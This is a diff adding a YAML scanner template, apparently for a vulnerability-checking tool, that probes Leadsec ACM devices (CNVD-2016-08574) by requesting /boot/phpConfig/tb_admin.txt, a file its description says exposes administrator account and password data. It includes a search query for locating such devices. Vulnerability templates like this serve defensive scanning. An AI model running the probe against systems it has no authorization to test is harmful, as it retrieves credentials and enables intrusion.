@@ -1,0 +1,19 @@
+name: Leadsec ACM information leakage CNVD-2016-08574
+manual: true
+query: product="Leadsec"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /boot/phpConfig/tb_admin.txt
+      follow_redirects: true
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: luckying1314@139.com
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08574
+  description: 'The account and password information is stored in the tb_admin.txt
+    file, which can be accessed directly  '
+  tags: infoleak
